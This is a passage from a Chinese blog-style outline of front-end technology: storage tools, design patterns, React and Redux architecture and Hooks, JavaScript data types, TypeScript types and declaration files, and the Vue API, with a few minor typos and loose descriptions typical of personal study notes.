title="存储"></a>存储</h3><ul><li><p>数据库</p><ul><li><p>MySql</p></li><li><p>MongoDB</p></li><li><p>Oracle</p></li><li><p>MSSQL</p><ul><li>微软的SQLServer数据库服务器</li></ul></li><li><p>PostreSQL</p><ul><li>功能强大的开源对象关系数据库系统</li></ul></li><li><p>MariaSQL</p></li></ul></li><li><p>缓存</p><ul><li>redis</li><li>memcache</li><li>nosql</li><li>mongodb</li><li>orm</li><li>sequelize（mysql）</li><li>bookshelf（mysql）</li><li>zookeeper</li></ul></li><li><p>消息队列</p><ul><li><p>RabbitMQ</p><ul><li>实现了高级消息队列协议（AMQP）的开源消息代理软件</li></ul></li><li><p>Kafka</p><ul><li>消息队列 Kafka 版是阿里云基于 Apache Kafka 构建的高吞吐量、高可扩展性的分布式消息队列服务</li></ul></li><li><p>zmq</p><ul><li>是一个消息处理队列库，可在多个线程、内核和主机盒之间弹性伸缩</li></ul></li><li><p>server render</p></li><li><p>websocket</p><ul><li>是一种在单个TCP连接上进行全双工通信的协议</li></ul></li></ul></li></ul><h3 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h3><ul><li><p>单例模式</p><ul><li>保证一个类只有一个实例</li></ul></li><li><p>适配器模式</p><ul><li>适配器模式可以使原本由于接口不兼容而不能一起工作的那些类可以一起工作</li></ul></li><li><p>装饰模式</p><ul><li>可以通过继承的方式，为一个基类对象扩展功能</li></ul></li><li><p>观察者模式</p><ul><li>就是为某一对象添加一监听事件</li></ul></li></ul><h2 id="主流技术栈-1"><a href="#主流技术栈-1" class="headerlink" title="主流技术栈"></a>主流技术栈</h2><h3 id="React-1"><a href="#React-1" class="headerlink" title="React"></a>React</h3><ul><li><p>简介</p><ul><li>React 是一个 MVC 框架</li><li>React 主要是用来构建 UI</li><li>React 是起源于Facebook的内部项目，用于构建 Instagram 网站，在 2013.05 开源</li></ul></li><li><p>特点</p><ul><li><p>声明式</p><ul><li>使用 React 编写UI界面和写HTML几乎一样</li></ul></li><li><p>高效</p><ul><li>React通过对DOM的模拟，最大限度地减少与DOM的交互</li></ul></li><li><p>灵活</p><ul><li>React可以与已知的库或框架很好地配合</li></ul></li></ul></li><li><p>生命周期</p><ul><li><p>constructor</p><ul><li>构造函数</li></ul></li><li><p>componentWillMount</p><ul><li>在渲染前调用,在客户端也在服务端（高版本已废弃）</li></ul></li><li><p>componentDidMount</p><ul><li>在第一次渲染后调用，只在客户端</li></ul></li><li><p>componentWillReceiveProps</p><ul><li>在组件接收到一个新的 prop (更新后)时被调用。这个方法在初始化render时不会被调用</li></ul></li><li><p>shouldComponentUpdate</p><ul><li>返回一个布尔值。在组件接收到新的props或者state时被调用。在初始化时或者使用forceUpdate时不被调用</li></ul></li><li><p>componentWillUpdate</p><ul><li>在组件接收到新的props或者state但还没有render时被调用。在初始化时不会被调用</li></ul></li><li><p>componentDidUpdate</p><ul><li>在组件完成更新后立即调用。在初始化时不会被调用</li></ul></li><li><p>componentWillUnmount</p><ul><li>在组件从 DOM 中移除的时候立刻被调用</li></ul></li></ul></li><li><p>React思想</p><ul><li><p>组件编写顺序</p><ul><li><p>1.组件划分原则</p><ul><li>解耦</li><li>复用</li><li>适度</li></ul></li><li><p>2.编写静态组件</p></li><li><p>3.分析State</p><ul><li><p>哪些是State</p><ul><li><ol><li>对组件进行两个灵魂质问</li></ol></li><li><ol start="2"><li>对State集合进行检查和去重</li></ol></li></ul></li><li><p>State保存的位置</p><ul><li>单一状态</li><li>状态上移</li></ul></li></ul></li><li><ol start="4"><li>添加交互行为</li></ol></li></ul></li><li><p>mock方式</p><ul><li>server</li><li>public</li></ul></li></ul></li><li><p>Redux思想</p><ul><li><p>使用redux是在解决什么问题</p><ul><li>问题原因：数据状态包括API数据，本地数据和UI状态等随着项目扩大变的管理复杂</li><li>解决问题的目的：防止管理状态失控</li><li>解决问题的手段：使用redux将视图层和状态管理层从逻辑上解耦</li></ul></li><li><p>State</p><ul><li>集中管理，全局唯一</li><li>不可变性</li><li>定义原则与React State定义原则相同</li></ul></li><li><p>Action</p><ul><li><p>普通Acion</p><ul><li>ActionCreators</li><li>ActionTypes</li></ul></li><li><p>异步Action</p><ul><li><p>异步action的创建</p><ul><li>请求开始action</li><li>请求成功action</li><li>请求失败action</li></ul></li><li><p>拓展reducer</p><ul><li>请求数据相关的state数据结构的变化</li><li>请求数据相关的reducer内容扩充</li></ul></li><li><p>集成redux-thunk</p><ul><li>问题原因：净化react组件的代码，想将数据请求放在action当中做</li><li>解决问题的目的：实现异步Action</li><li>解决问题的手段：使用redux-thunk实现异步Action，抽离react中的数据请求代码</li></ul></li></ul></li></ul></li><li><p>Reducer</p><ul><li>combineReducers</li></ul></li><li><p>Store</p></li><li><p>redux-devtools</p><ul><li>浏览器插件</li><li>项目依赖库</li></ul></li></ul></li><li><p>React-Redux思想</p><ul><li><p>使用react-redux是在解决什么问题</p><ul><li>问题原因：reactUI层和redux状态层的相关代码冗杂在react组件中</li><li>解决问题的目的：既能链接reactUI层和redux状态层，又不让两者代码糅合</li><li>解决问题的手段：使用react-redux将视图层和状态管理层从代码上解耦</li></ul></li><li><p>功能</p><ul><li>Provider组件</li><li>connect高阶HOC组件</li><li>map api</li></ul></li><li><p>容器性组件和展示性组件</p><ul><li>关注点</li><li>对redux感知</li><li>读数据</li><li>写数据</li><li>如何创建</li></ul></li><li><p>流程图总结</p><ul><li><a href="https://www.taopoppy.cn/react_redux_jiagou_react_redux.png" target="_blank" rel="noopener">https://www.taopoppy.cn/react_redux_jiagou_react_redux.png</a></li></ul></li></ul></li><li><p>React-Router</p><ul><li><p>服务端路由和客户端路由的区别</p><ul><li>服务端路由：访问<a href="http://a就返回a.html，访问http://b就返回b.html，是服务器根据不同的路由返回不同的页面" target="_blank" rel="noopener">http://a就返回a.html，访问http://b就返回b.html，是服务器根据不同的路由返回不同的页面</a></li><li>客户端路由：无论访问什么路径，返回的页面信息都是相同的，是通过js通过判断路径的不同来渲染不同的组件而已，所以叫做客户端路由</li></ul></li><li><p>BrowserRouter和HashRouter区别</p><ul><li>之前说react-router-dom是将react-route和web-api做绑定，这些web-api具体指的就是HTML5 history API，利用这些pushState、replaceState等方法实现在客户端实现路由的操作</li><li>哈希路由是使用url的hash部分作为路由信息，是通过使用页面不同的哈希和不同的组件之间做映射来完成的，哈希的出现主要为了兼容老版本浏览器，因为老版本的浏览器不支持history的API，所以通过哈希的变化来实现路由的变化。但是这样的情况在现在已经很少了，而且哈希的本身含义就是页面的定位，其逻辑也不符合路由的需求</li></ul></li><li><p>路由渲染组件的三种方式</p><ul><li>component</li><li>render</li><li>children</li></ul></li><li><p>全新思维</p><ul><li>一切皆组件</li><li>动态路由离散式声明法</li></ul></li></ul></li><li><p>架构设计基础</p><ul><li><p>React+Redux项目结构组织方式</p><ul><li><p>type（按照类型）</p><ul><li><p>定义</p><ul><li>类型指的是该文件在项目当中充当的角色类型</li></ul></li><li><p>特点</p><ul><li><p>优点</p><ul><li>目录结构清晰却明确，功能文件比较紧凑</li></ul></li><li><p>缺点</p><ul><li>新添功能需要在不同的文件中做修改</li><li>不利于多人合作下的代码表写和提交合并</li></ul></li></ul></li></ul></li><li><p>function（按照功能模块）</p><ul><li><p>定义</p><ul><li>功能指的是按照功能或者页面将相关的文件写在同一个文件夹</li></ul></li><li><p>特点</p><ul><li><p>优点</p><ul><li>有利于新功能的开发和拓展</li></ul></li><li><p>缺点</p><ul><li>容易造成store当中存在大量重复性的数据</li><li>同一状态在不同的模块中会有不一致的风险</li></ul></li></ul></li></ul></li><li><p>Ducks（鸭子类型）</p><ul><li><p>定义</p><ul><li>将应用的状态作为模块的划分依据</li></ul></li><li><p>特点</p><ul><li>目录结构清晰紧凑，添加新功能只需添加新模块文件即可</li><li>组件需要任何状态只需要引入对应的state模块文件即可</li></ul></li></ul></li></ul></li><li><p>三种设计Redux-State的依据</p><ul><li><p>API为依据</p><ul><li><p>定义</p><ul><li>以后端API返回数据结构作为State的数据结构</li></ul></li><li><p>缺点</p><ul><li>大量数组类型的结构会造成重复数据的存在</li></ul></li></ul></li><li><p>UI为依据</p><ul><li><p>定义</p><ul><li>不同的UI显示都对应一份State</li></ul></li><li><p>缺点</p><ul><li>State数量过多，容易出现错误的State和重复的State</li></ul></li></ul></li><li><p>数据库基本原则为依据</p><ul><li>整个应用的状态按照领域分成若干子State，子State之间不能保存重复的数据</li><li>State以键值对的结构存储数据，以记录的key/Id作为记录的索引，记录中的其他字段都依赖于索引</li><li>State中不能保存可以通过已有数据计算而来的数据，即State中的字段不互相依赖</li></ul></li></ul></li></ul></li><li><p>架构设计进阶</p><ul><li><p>selector函数</p><ul><li><p>使用selector是在解决什么问题</p><ul><li>问题原因：redux和容器性组件存在部分耦合，redux中的state结构变化会影响后者</li><li>解决问题的目的：实现react容器性组件和redux状态层的终极解耦</li><li>解决问题的手段：selectors是作为不同层级之间的接口不仅彻底解耦了层级，还使得不同层级通过接口进行安全交互和通讯得以实现</li></ul></li><li><p>selector带来的好处</p><ul><li>selector限制了层级的内部变化影响范围最多到接口</li><li>selector防止不同层级互相知道内部结构的风险</li><li>selector可以负责计算和过滤的工作</li></ul></li></ul></li><li><p>redux中间件（Middleware）</p><ul><li>middleware的写法</li><li>middleware的本质</li></ul></li><li><p>redux增强器（Enhancer）</p><ul><li><p>Enhancer的写法</p></li><li><p>Enhancer和Middleware的关系</p><ul><li>实际上middleware是store enhancer的一种，中间件虽然比较低阶，但是它约束了我们的行为，而增强器enhancer虽然更加灵活，但是破坏redux底层结构的风险更大，所以如果你对redux整体的结构和逻辑都不是太熟悉，尽量就别用</li></ul></li></ul></li></ul></li><li><p>架构设计高级</p><ul><li><p>reducer如何返回新的state对象</p><ul><li><p>Object.assign</p></li><li><p>ES6扩展语法</p></li><li><p>Immutable</p><ul><li><p>Immutable的常规使用</p></li><li><p>Immutable的优化</p></li><li><p>Immutable的选择考虑</p><ul><li>对项目的整体侵入性很强，我们需要改的地方很多，如果你的项目不是很大，且store当中的数据层级不是很多，结构不复杂，不推荐使用的，我们一定要根据需求去搭建架构，去决定是否使用某些工具</li></ul></li></ul></li></ul></li><li><p>Reselect</p><ul><li><p>使用Reselect是解决什么问题</p><ul><li>store当中的state发生了变化，每个容器型组件的mapStateToProps都要重新执行，产生的结果就是上述的这些selectors函数也要重复执行，也就导致了重复计算，使用Reselect创建的selectors函数，只要使用到的state没有发生变化，这个selectors函数就不会去重新计算，比如getVisibleTodos函数使用到了state.filter和state.todos，修改state.text并不会影响state.filter和state.todos，所以getVisibleTodos函数也就不会重复执行</li></ul></li><li><p>Reselect的常规使用</p></li><li><p>Reselect的选择考虑</p></li></ul></li></ul></li><li><p>React Hooks</p><ul><li><p>特性</p><ul><li>hooks 的出现使得你可以在不编写 class 的情况下使用状态管理以及其它 React 的特性</li></ul></li><li><p>Hooks API</p><ul><li><p>useState</p><ul><li>用来承担与类组件中的 state 一样的作用，组件内部的状态管理</li></ul></li><li><p>useEffect</p><ul><li>可以用来模拟生命周期，即可以完成某些副作用</li></ul></li><li><p>useLayoutEffect</p><ul><li>它与 useEffect 的用法完全一样，作用也基本相同，唯一的不同在于执行时机，它会在所有的 DOM 变更之后同步调用 effect，可以使用它来</li></ul></li><li><p>useReducer</p><ul><li>useState 的替代方案，它接收一个 (state, action) =&gt; newState 的 reducer 处理函数，并返回当前的 state 和 配套的 dispatch 方法。使用方法与 redux 非常相似</li></ul></li><li><p>useCallback</p><ul><li>它有的作用：性能优化，父组件更新，传递给子组件的函数指针不会每次都改变，只有当依赖项发生改变的时候才会改变指针。避免了子组件的无谓渲染</li><li>它的本质是对函数依赖进行分析，依赖变更时才重新执行。</li></ul></li><li><p>useMemo</p><ul><li>useMemo 用于缓存一些耗时的计算结果（返回值），只有当依赖项改变时才重新进行计算</li></ul></li><li><p>useContext</p><ul><li>专门为函数组件提供的 context hook API，可以更加方便地获取 context 的值</li><li>useContext(MyContext) 接收一个 context 对象，当前获取到的值由上层组件中距离最近的 &lt;MyContext.Provider&gt; 的 value 决定</li></ul></li><li><p>useRef</p><ul><li>useRef 返回一个可变的 ref 对象，其 current 属性被初始化为传入的参数。返回的 ref 对象在组件的整个生命周期内保持不变</li></ul></li></ul></li></ul></li><li><p>未完待续…</p></li></ul><h3 id="Angular-1"><a href="#Angular-1" class="headerlink" title="Angular"></a>Angular</h3><ul><li>博主未曾使用特附上一个其他大神总结的链接</li><li><a href="https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/angular.png" target="_blank" rel="noopener">https://img.58cdn.com.cn/escstatic/docs/imgUpload/gongchenghui/angular.png</a></li></ul><h3 id="JavaScript-1"><a href="#JavaScript-1" class="headerlink" title="JavaScript"></a>JavaScript</h3><ul><li><p>JS变量</p><ul><li><p>变量声明</p><ul><li><p>声明</p><ul><li>显示声明<br>var 变量名</li><li>隐式声明<br>自动添加到闭包</li></ul></li><li><p>陋习</p><ul><li>没有类型</li><li>重复声明</li><li>隐式声明</li><li>不声明直接赋值</li></ul></li><li><p>提倡</p><ul><li>先声明后使用</li><li>先赋值后运算</li></ul></li></ul></li><li><p>作用域</p><ul><li><p>全局变量</p><ul><li><p>包含</p><ul><li>在函数体外定义的变量</li><li>在函数体内定义的无var的变量</li></ul></li><li><p>调用</p><ul><li>任何位置</li></ul></li></ul></li><li><p>局部变量</p><ul><li><p>包含</p><ul><li>在函数体内部var声明的变量</li><li>函数的参数变量</li></ul></li><li><p>调用</p><ul><li>当前函数体内部</li></ul></li></ul></li><li><p>优先级</p><ul><li>局部变量高于同名全局变量</li><li>参数变量高于同名全局变量</li><li>局部变量高于同名参数变量</li></ul></li><li><p>特性</p><ul><li><p>忽略块级作用域</p></li><li><p>全局变量是全局对象的属性</p></li><li><p>局部变量是调用对象的属性</p></li><li><p>作用域链</p><ul><li>内层函数可访问外层函数局部变量</li><li>外层函数不能访问内层函数局部变量</li></ul></li><li><p>生命周期</p><ul><li><p>全局变量</p><ul><li>除非被显示删除，否则一直存在</li></ul></li><li><p>局部变量</p><ul><li>自声明起至函数执行完毕或被显示删除</li></ul></li><li><p>回收机制</p><ul><li>标记清除</li><li>引用计数</li></ul></li></ul></li></ul></li></ul></li></ul></li><li><p>JS数据类型</p><ul><li><p>undefined</p><ul><li>使用var声明但未初始化</li><li>区分空对象指针与尚未定义的变量</li><li>对未初始化的变量及未声明的变量使用typeof都返回undefined</li></ul></li><li><p>null</p><ul><li>逻辑上null表示一个空对象的指针</li><li>使用typeof检测时会返回object</li></ul></li><li><p>boolean</p><ul><li><p>true为真false为假</p></li><li><p>true不一定=1 false不一定=0</p></li><li><p>使用Boolean()进行转换</p><ul><li><p>转换为true</p><ul><li>任何非空字符串</li><li>任何非空对象</li><li>任何非零数字</li></ul></li><li><p>转换为false</p><ul><li>空字符串</li><li>0和NaN</li><li>null及undefined</li></ul></li></ul></li></ul></li><li><p>string</p><ul><li><p>特性</p><ul><li><p>0个或多个16位Unicode字符组成</p></li><li><p>单引号与双引号不能交叉使用</p></li><li><p>使用.length属性访问字符串长度</p><ul><li>转义序列表示一个字符串</li><li>无法精确返回双字节字符串长度</li></ul></li><li><p>字符串一旦被创建，其值将不能改变，若要改变必须销毁原有字符串</p></li></ul></li><li><p>转义序列</p><ul><li>\n 换行</li><li>\t 制表符</li><li>\b 空格</li><li>\r 回车</li><li>\f 分页符</li><li>\ 斜杠\</li><li>&#39; 单引号</li><li>&quot; 双引号</li><li>\xnn 十六进制数，n代表0~F</li><li>\unnnn 以十六进制表示一个Unicode字符</li></ul></li><li><p>类型转换</p><ul><li><p>toString()</p><ul><li><p>使用类型</p><ul><li>number</li><li>string</li><li>object</li><li>boolean</li></ul></li><li><p>参数</p><ul><li>number类型的数值基数</li></ul></li></ul></li><li><p>String()</p><ul><li>undefined</li><li>null</li></ul></li><li><p>evel()</p><ul><li>计算字符串表达式的值并以数值的形式返回</li></ul></li></ul></li></ul></li><li><p>number</p><ul><li><p>进制</p><ul><li>十进制</li><li>八进制</li><li>十六进制</li></ul></li><li><p>浮点数</p><ul><li><p>小数点后至少一位数字</p></li><li><p>科学计数法</p><ul><li>小数点后带有6个0的浮点数</li><li>以e为底*10的±N次幂</li></ul></li><li><p>最高精度</p><ul><li>17位小数</li></ul></li><li><p>缺陷</p><ul><li>存在舍入误差</li><li>无法测试特定浮点数值</li></ul></li></ul></li><li><p>数值范围</p><ul><li><p>最小值</p><ul><li><p>Number.MIN_VALUE</p><ul><li>5e-324</li></ul></li></ul></li><li><p>最大值</p><ul><li><p>Number.MAX_VALUE</p><ul><li>1.7976931348623157e+308</li></ul></li></ul></li><li><p>超出范围</p><ul><li><p>正无穷</p><ul><li>Infinity</li><li>Number.POSITIVE_INFINITY</li></ul></li><li><p>负无穷</p><ul><li>-Infinity</li><li>Number.NEGATIVE_INFINITY</li></ul></li><li><p>缺陷</p><ul><li>无法参与下一次计算</li></ul></li><li><p>检测方法</p><ul><li><p>isFinite()</p><ul><li>可转换为数值 true</li><li>不可转换为数值 false</li></ul></li></ul></li></ul></li></ul></li><li><p>NaN</p><ul><li><p>含义</p><ul><li>Not a Number</li><li>非数值</li></ul></li><li><p>特性</p><ul><li>任何涉及NaN的操作都将返回NaN</li><li>NaN与任何值都不相等包括自身</li></ul></li><li><p>检测</p><ul><li><p>isNaN()</p><ul><li>可转换为数值 false</li><li>不可转换为数值 true</li></ul></li></ul></li></ul></li><li><p>数值转换</p><ul><li><p>Number()</p><ul><li><p>Boolean</p><ul><li><p>true</p><ul><li>1</li></ul></li><li><p>false</p><ul><li>0</li></ul></li></ul></li><li><p>null</p><ul><li>0</li></ul></li><li><p>undefined</p><ul><li>NaN</li></ul></li><li><p>String</p><ul><li><p>只包含数字</p><ul><li>十进制数</li><li>前导0被忽略</li></ul></li><li><p>包含有浮点格式</p><ul><li>浮点数值</li><li>忽略前导0</li></ul></li><li><p>包含有效十六进制数</p><ul><li>相同大小的十进制数</li></ul></li><li><p>空字符串</p><ul><li>0</li></ul></li><li><p>其他字符串</p><ul><li>NaN</li></ul></li></ul></li><li><p>object</p><ul><li>基于toString转成字符串，再转换成数字</li></ul></li></ul></li></ul></li></ul></li><li><p>object</p><ul><li><p>定义</p><ul><li>一组数据或者功能的集合</li></ul></li><li><p>声明</p><ul><li>var obj = new Object()</li><li>var obj = {}</li></ul></li><li><p>属性与方法</p><ul><li><p>constructor</p><ul><li>保存拥有创建当前对象的函数</li></ul></li><li><p>hasOwnProperty</p><ul><li>检测给定属性在当前对象中是否存在</li></ul></li><li><p>isPrototypeOf</p><ul><li>检测传入的对象是否是另一个对象的原型</li></ul></li><li><p>propertyIsEnumerable</p><ul><li>检测给定的属性是否能用for-in枚举</li></ul></li><li><p>toLocaleString</p><ul><li>返回对象的字符串表示，该字符串与执行环境的地区对应</li></ul></li><li><p>toString</p><ul><li>返回对象的字符串表示</li></ul></li><li><p>valueOf</p><ul><li>返回对象的字符串、布尔或数值表示</li></ul></li></ul></li></ul></li></ul></li><li><p>未完待续…</p></li></ul><h3 id="TypeScript-1"><a href="#TypeScript-1" class="headerlink" title="TypeScript"></a>TypeScript</h3><ul><li><p>基础类型</p><ul><li><p>string</p><ul><li><p>同JavaScript用”或者’标识字符串</p><ul><li>let name: string = “abc”</li></ul></li></ul></li><li><p>number</p><ul><li><p>数组</p><ul><li><p>number[]</p><ul><li>let list: number[] = [1,2,3]</li></ul></li><li><p>Array&lt;元素类型&gt;</p><ul><li>let list: Array<number> = [1,2,3]</number></li></ul></li></ul></li><li><p>数字</p><ul><li>let decLiteral: number = 6</li></ul></li></ul></li><li><p>boolean</p><ul><li>let isDone: boolean = false</li></ul></li><li><p>Tuple</p><ul><li>元组类型允许表示一个已知元素数量和类型的数组，各元素的类型不必相同</li><li>let x: [string, number];<br>x = [‘hello’, 10]; // OK</li></ul></li><li><p>enum</p><ul><li>枚举类型是对JavaScript标准数据类型的一个补充</li><li>enum Color {Red, Green, Blue}<br>let c: Color = Color.Green;</li></ul></li><li><p>Any</p><ul><li>未知的数据类型一般使用any</li></ul></li><li><p>Void</p><ul><li>void类型像是与any类型相反，它表示没有任何类型</li></ul></li><li><p>Null 和 Undefined</p><ul><li>undefined和null两者各自有自己的类型分别叫做undefined和null</li><li>它们的本身的类型用处不是很大</li><li>默认情况下null和undefined是所有类型的子类型</li></ul></li><li><p>Never</p><ul><li>never类型表示的是那些永不存在的值的类型</li><li>never类型是任何类型的子类型，也可以赋值给任何类型</li><li>没有类型是never的子类型或可以赋值给never类型（除了never本身之外）</li><li>即使 any也不可以赋值给never</li></ul></li><li><p>Object</p><ul><li>object表示非原始类型</li><li>也就是除number，string，boolean，symbol，null或undefined之外的类型</li></ul></li></ul></li><li><p>接口</p><ul><li><p>特殊符号</p><ul><li><p>可选</p><ul><li>?</li></ul></li><li><p>只读</p><ul><li>readonly</li></ul></li><li><p>签名</p><ul><li><p>字符串型签名</p></li><li><p>数组型签名</p><ul><li>数字型签名会将数字转换成字符串再去匹配</li></ul></li><li><p>如果同时使用那么数组型签名的返回值必须是字符串型签名的子类的返回值</p></li></ul></li></ul></li><li><p>对象型接口</p><ul><li><p>普通模式</p><ul><li>key需要对应上</li></ul></li><li><p>配合签名使用的option模式</p></li></ul></li><li><p>函数型接口</p><ul><li><p>参数</p><ul><li>不需要key对应，只需要相应位置的相应类型对应</li></ul></li><li><p>返回值</p></li></ul></li><li><p>类类型接口</p><ul><li><p>特点</p><ul><li>接口只需要描述类的公共部分，不会去检查私有部分</li></ul></li><li><p>构造函数的控制方式</p><ul><li>构造函数时金泰属性，不属于公共部分</li><li>控制new过程</li></ul></li></ul></li><li><p>接口继承</p><ul><li>接口的切割和继承</li><li>特点：类可当做值也可以当做类型</li></ul></li></ul></li><li><p>类class</p><ul><li><p>定义了一件事物的抽象特点，包含它的属性和方法</p></li><li><p>ES6类的使用</p><ul><li><p>属性和方法</p><ul><li>使用class定义类</li><li>使用constructor定义构造函数</li><li>通过new生成实例会自动调用构造函数</li></ul></li><li><p>类的继承</p><ul><li>使用extends关键字实现继承</li><li>子类中使用super关键字来调用父类的构造函数和方法</li></ul></li><li><p>静态方法</p><ul><li>使用static修饰符修饰的方法称为静态类</li><li>不需要实例化</li><li>直接通过类来调用</li></ul></li></ul></li><li><p>TypeScript类的使用</p><ul><li><p>三种访问修饰符</p></li><li><p>public</p><ul><li>public 修饰的属性或方法是公有的，可以在任何地方被访问到</li><li>默认所有的属性和方法都是 public </li></ul></li><li><p>private</p><ul><li>private 修饰的属性或方法是私有的</li><li>不能在声明它的类的外部访问</li><li>很多时候，我们希望有的属性是无法直接存取的，这时候就可以用 private 了</li><li>需要注意的是，TypeScript 编译之后的代码中，并没有限制 private 属性在外部的可访问性</li><li>使用 private 修饰的属性或方法，在子类中也是不允许访问的</li></ul></li><li><p>protected</p><ul><li>protected 修饰的属性或方法是受保护的</li><li>它和 private 类似，区别是它在子类中也是允许被访问的</li></ul></li></ul></li><li><p>抽象类 </p><ul><li>抽象类是供其它类继承的基类</li><li>他们一般不会直接被实例化</li><li>抽象类可以包含成员的实现细节</li><li>abstract关键字是用于定义抽象类和在抽象类内部定义抽象方法</li><li>抽象类中的抽象方法不包含具体实现并且必须在派生类中实现</li><li>抽象方法的语法与接口方法相似。 两者都是定义方法签名不包含方法体。 然而，抽象方法必须使用abstract关键字并且可以包含访问符</li></ul></li><li><p>类的类型</p><ul><li>实现方式类似接口</li></ul></li><li><p>类实现接口</p><ul><li>实现（implements）是面向对象中的一个重要概念</li><li>一般来讲，一个类只能继承自另一个类，有时候不同类之间可以有一些共有的特性，这时候就可以把特性提取成接口（interfaces），用 implements 关键字来实现</li><li>这个特性大大提高了面向对象的灵活性</li></ul></li></ul></li><li><p>函数</p><ul><li><p>有可选参数的函数</p><ul><li>调用函数时传的参数的数量或者类型不符合函数中定义的参数要求时，TypeScript编译器会报错</li><li>在一些场景下我们不需要传所有的参数；TypeScript一个函数可选参数的特性；</li><li>在TypeScript中通过在函数参数后面追加一个?，指定参数是可选的</li></ul></li><li><p>有默认参数的函数</p><ul><li>当函数有可选参数时，我们必须检测参数是否被传递了</li><li>在声明函数签名时使用=提供一个默认值，即可指定函数参数是可选的；</li><li>TypeScript编译会在JavaScript输出结果中生成一个if结构</li></ul></li><li><p>有剩余参数的函数</p><ul><li>add = (…foo:number[]):number =&gt; {}</li></ul></li></ul></li><li><p>声明文件</p><ul><li><p>场景</p><ul><li>当使用第三方库时，我们需要引用它的声明文件，才能获得对应的代码补全、接口提示等功能</li></ul></li><li><p>什么是声明语句</p><ul><li><p>假如我们想使用第三方库 jQuery，一种常见的方式是在 html 中通过 <script> 标签引入 jQuery，然后就可以使用全局变量 $ 或 jQuery 了</p><ul><li>$('body')</li></ul></li><li><p>但是在 ts 中，编译器并不知道 $ 或 jQuery 是什么东西</p></li><li><p>这时，我们需要使用 declare var 来定义它的类型:</p><ul><li>declare var $: (selector: string) => any;</li></ul></li><li><p>declare var 并没有真的定义一个变量，只是定义了全局变量 $ 的类型，仅仅会用于编译时的检查，在编译结果中会被删除</p></li></ul></li><li><p>什么是声明文件</p><ul><li>通常我们会把声明语句放到一个单独的文件（index.d.ts）中，这就是声明文件</li><li>声明文件必须以.d.ts为后缀</li></ul></li><li><p>第三方声明文件</p><ul><li><p>我们可以直接下载下来使用，但是更推荐的是使用 @types 统一管理第三方库的声明文件。</p></li><li><p>@types 的使用方式很简单，直接用 npm 安装对应的声明模块即可，以 jQuery 举例：</p><ul><li>npm install @types/jquery --save-dev</li></ul></li></ul></li><li><p>书写声明文件</p><ul><li><p>库文件使用场景</p><ul><li><p>全局变量</p><ul><li>通过 <script> 标签引入第三方库，注入全局变量</li></ul></li><li><p>npm包</p><ul><li>通过 import foo from 'foo' 导入，符合 ES6 模块规范</li></ul></li><li><p>UMD库</p><ul><li>既可以通过 <script> 标签引入，又可以通过 import 导入</li></ul></li><li><p>直接扩展全局变量</p><ul><li>通过 <script> 标签引入后，改变一个全局变量的结构</li></ul></li><li><p>在 npm 包或 UMD 库中扩展全局变量</p><ul><li>引用 npm 包或 UMD 库后，改变一个全局变量的结构</li></ul></li><li><p>模块插件</p><ul><li>通过 <script> 或 import 导入后，改变另一个模块的结构</li></ul></li></ul></li><li><p>全局变量声明</p><ul><li><p>使用全局变量的声明文件时，如果是以 npm install @types/xxx --save-dev 安装的，则不需要任何配置。否则就需要在声明文件中声明全局变量</p></li><li><p>全局变量的几种声明方式</p><ul><li><p>declare var/const/let</p><ul><li>声明全局变量</li></ul></li><li><p>declare function</p><ul><li>声明全局方法</li></ul></li><li><p>declare class</p><ul><li>声明全局类</li></ul></li><li><p>declare enum</p><ul><li>声明全局枚举类型</li></ul></li><li><p>declare namespace</p><ul><li>声明（含有子属性的）全局对象</li></ul></li><li><p>interface 和 type</p><ul><li>声明全局类型</li></ul></li></ul></li></ul></li></ul></li></ul></li><li><p>未完待续...</p></li></ul><h3 id="Vue-1"><a href="#Vue-1" class="headerlink" title="Vue"></a>Vue</h3><ul><li><p>简介</p><ul><li>Vue是一个MVVM框架</li><li>Vue是用于构建用户界面的渐进式框架</li><li>尤雨溪最开始想起名为 seed.js，但是npm已经被注册了，后来根据  ”view“起名为 vue</li><li>2014年由Laravel框架作者推荐后逐渐流行</li></ul></li><li><p>特点</p><ul><li><p>易用</p><ul><li>已经会了 HTML、CSS、JavaScript？即刻阅读指南开始构建应用！</li></ul></li><li><p>灵活</p><ul><li>不断繁荣的生态系统，可以在一个库和一套完整框架之间自如伸缩。</li></ul></li><li><p>高效</p><ul><li>20kB min+gzip 运行大小</li><li>超快虚拟 DOM</li><li>最省心的优化</li></ul></li></ul></li><li><p>Vue思想</p><ul><li>数据驱动</li><li>组件化</li></ul></li><li><p>Vue API</p><ul><li><p>应用API</p><ul><li><p>component</p><ul><li>注册或检索全局组件。注册还会使用给定的 name 参数自动设置组件的 name。</li></ul></li><li><p>config</p><ul><li>包含应用配置的对象。</li></ul></li><li><p>directive</p><ul><li>注册或检索全局指令。</li></ul></li><li><p>mixin</p><ul><li>在整个应用范围内应用混入。一旦注册，它们就可以在当前的应用中任何组件模板内使用它。插件作者可以使用此方法将自定义行为注入组件。不建议在应用代码中使用。</li></ul></li><li><p>mount</p><ul><li>将应用实例的根组件挂载在提供的 DOM 元素上</li></ul></li><li><p>provide</p><ul><li>设置一个可以被注入到应用范围内所有组件中的值。组件应该使用 inject 来接收 provide 的值。</li><li>从 provide/inject 的角度来看，可以将应用程序视为根级别的祖先，而根组件是其唯一的子级。</li><li>该方法不应该与 provide 组件选项或组合式 API 中的 provide 方法混淆。虽然它们也是相同的 provide/inject 机制的一部分，但是是用来配置组件 provide 的值而不是应用 provide 的值。</li><li>通过应用提供值在写插件时尤其有用，因为插件一般不能使用组件提供值。这是使用 globalProperties 的替代选择。</li></ul></li><li><p>unmount</p><ul><li>在提供的 DOM 元素上卸载应用实例的根组件。</li></ul></li><li><p>use</p><ul><li>安装 Vue.js 插件。如果插件是一个对象，它必须暴露一个 install 方法。如果它本身是一个函数，它将被视为安装方法。</li><li>该安装方法将以应用实例作为第一个参数被调用。传给 use 的其他 options 参数将作为后续参数传入该安装方法。</li><li>当在同一个插件上多次调用此方法时，该插件将仅安装一次</li></ul></li></ul></li><li><p>全局API</p><ul><li><p>createApp</p><ul><li>返回一个提供应用上下文的应用实例。应用实例挂载的整个组件树共享同一个上下文。</li></ul></li><li><p>h</p><ul><li>返回一个”虚拟节点“，通常缩写为 VNode：一个普通对象，其中包含向 Vue 描述它应在页面上渲染哪种节点的信息，包括所有子节点的描述。它的目的是用于手动编写的渲染函数</li></ul></li><li><p>defineComponent</p><ul><li>从实现上看，defineComponent 